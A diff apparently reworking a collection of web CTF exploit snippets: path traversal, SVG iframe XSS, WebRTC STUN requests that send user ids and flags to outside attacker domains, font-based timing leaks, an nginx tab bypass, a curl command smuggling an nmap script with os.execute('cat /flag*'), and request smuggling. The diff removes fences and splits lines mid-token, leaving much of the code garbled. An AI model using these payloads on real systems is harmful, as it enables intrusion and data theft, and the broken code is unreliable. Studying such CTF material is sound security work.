@@ -6,72 +6,49 @@
 
 ```
 {
- flag0:flag(pin:0),
- flag1:flag(pin:1),
- flag2:flag(pin:2),
- flag3:flag(pin:3),
- flag4:flag(pin:4),
- flag5:flag(pin:5)
+ flag0:
+flag(pin:0),
+ flag1:
+flag(pin:1),
+ flag2:
+flag(pin:2),
+ flag3:
+flag(pin:3),
+ flag4:
+flag(pin:4),
+ flag5:
+flag(pin:5)
 }
-```
-
-
-
-```
-@app.route('/anonymized/<image_file>')
+@app.route('/anonymized/')
 def serve_image(image_file):
  file_path = os.path.join(UPLOAD_FOLDER, unquote(image_file))
  if ".." in file_path or not os.path.exists(file_path):
  return f"Image {file_path} cannot be found.", 404
  return send_file(file_path, mimetype='image/png')
-```
-
-
-
-```
 >>> os.path.join('/tmp/abc', 'test.txt')
 '/tmp/abc/test.txt'
 >>> os.path.join('/tmp/abc', '/test.txt')
 '/test.txt'
-```
-
-
-
-```
 <?xml version="1.0" standalone="no"?>
 <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
 
 <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
- <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+ 
 
  <foreignObject>
- <iframe srcdoc="&lt;script&gt;alert(document.domain)&lt;/script&gt;"></iframe>
+ 
  </foreignObject>
 </svg>
-```
-
-
-
-```
 <script>
 async function a(){
- c={iceServers:[{urls:"stun:{{user.id}}.x.cjxol.com:1337"}]}
+ c={iceServers:[{urls:"stun:{{user.id}}.x.cjxol.com:
+1337"}]}
  (p=new RTCPeerConnection(c)).createDataChannel("d")
  await p.setLocalDescription()
 }
 a();
 </script>
-```
-
-
-
-```
 Content-Security-Policy "script-src 'none'; object-src 'none'; frame-ancestors 'none';";
-```
-
-
-
-```
 <script>
  const sleep = ms => new Promise(resolve => setTimeout(resolve, ms))
  async function clearCache() {
@@ -133,22 +110,13 @@ await testNote('{z','https://leakynote.be.ax/post.php?id=a71fc5d1ff81edad')
 
  main()
 </script>
-```
-
-
-
-```
 @font-face {
  font-family: a;
  src: url(/time-before),url(/search.php?query=corctf{a),url(/search.php?query=corctf{a),... /*10000 times */,url(/time-after)
 }
-```
-
-
-
-```
 location / {
- proxy_pass http://localhost:7777;
+ proxy_pass http://localhost:
+7777;
 
  location ^~ /generate {
  allow 127.0.0.1;
@@ -160,36 +128,13 @@ location / {
  deny all;
  }
 }
-```
-
-
-
-```
 POST /generate{chr(9)}HTTP/1.1/../../ HTTP/1.1
-```
-
-
-
-```
 nmap -p #{port} #{hostname}
-```
-
-
-
-```
 --script http-fetch -Pn --script-args http-fetch.destination={DOWNLOAD_DIR},http-fetch.url={NSE_SCRIPT}
 --script={DOWNLOAD_DIR}/{LHOST}/{LPORT}/{NSE_SCRIPT}
-```
-
-
-
-```
-curl http://35.231.135.130:32190/ -F $'service=127.0.0.1:1337\t--script\t/tmp/RackMultipart?????????????????' -F '=os.execute("cat /flag*");filename=evil'
-```
-
-
-
-```
+curl http://35.231.135.130:
+32190/ -F $'service=127.0.0.1:
+1337\t--script\t/tmp/RackMultipart?????????????????' -F '=os.execute("cat /flag*");filename=evil'
 GET /aaaaa HTTP/1.1
 Host: localhost
 transfer-encoding: chunked
@@ -200,11 +145,6 @@ Content-Length: 102
 GET /post/56e02543-8616-4536-9062-f18a4a466a03/e85a6915-0fe6-4ca6-a5e7-862d00bca6e5 HTTP/1.1
 X: GET /56e02543-8616-4536-9062-f18a4a466a03/.well-known/jwks.json HTTP/1.1
 Host: localhost
-```
-
-
-
-```
 <?php
  header("Content-Security-Policy: default-src 'none'; frame-ancestors 'none'; script-src 'unsafe-inline' 'unsafe-eval';");
  header("Cross-Origin-Opener-Policy: same-origin");
@@ -221,33 +161,22 @@ Host: localhost
 ?>
 <!DOCTYPE html>
 <html>
- <body>
- <iframe
- sandbox="allow-scripts"
- srcdoc="<!-- <?php echo htmlspecialchars($flag) ?> --><div><?php echo htmlspecialchars($payload); ?></div>"
- ></iframe>
- </body>
+ 
+  --><?php echo htmlspecialchars($payload); ?>"
+ >
+ 
 </html>
-```
-
-
-
-```
 var flag = document.childNodes[0].nodeValue.trim()
  .replace("SEKAI{", "").replace("}", "")
  .split("").map(c => c.charCodeAt(0)).join(".");
 var p = new RTCPeerConnection({
  iceServers: [{
- urls: "stun:" + flag + ".29e6037fd1.ipv6.1433.eu.org:1337"
+ urls: "stun:" + flag + ".29e6037fd1.ipv6.1433.eu.org:
+1337"
  }]
 });
 p.createDataChannel("d");
 p.setLocalDescription()
-```
-
-
-
-```
 // leakless note oracle
 const oracle = async (w, href) => {
  const runs = [];
